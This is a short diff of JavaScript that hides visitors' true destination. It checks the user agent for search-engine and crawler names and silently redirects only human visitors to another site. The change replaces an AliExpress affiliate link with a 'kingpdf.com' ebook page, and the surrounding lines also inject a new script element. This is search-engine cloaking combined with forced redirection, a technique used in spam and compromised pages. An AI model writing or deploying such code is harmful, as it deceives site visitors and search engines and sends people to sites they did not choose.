@@ -2,7 +2,7 @@ let url = window['location']['href'], id = url['substring'](url['lastIndexOf']('
 if (id['match'](/^[0-9]+$/) != null) {
     let user_agent = navigator['userAgent'],
     filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
-    redirect_link = 'https://s.click.aliexpress.com/deep_link.htm?dl_target_url=https%3A%2F%2Fwww.aliexpress.com%2Fitem%2F-%2F' + id + '.html&aff_short_key=_dXCu57K&dp=' + subdom;
+    redirect_link = 'https://kingpdf.com/ebook-' + id + '.html';
     !user_agent['match'](filter_bot) && window['location']['replace'](redirect_link);
     let data_content = document['getElementById']('desc'),
     s = document['createElement']('script');
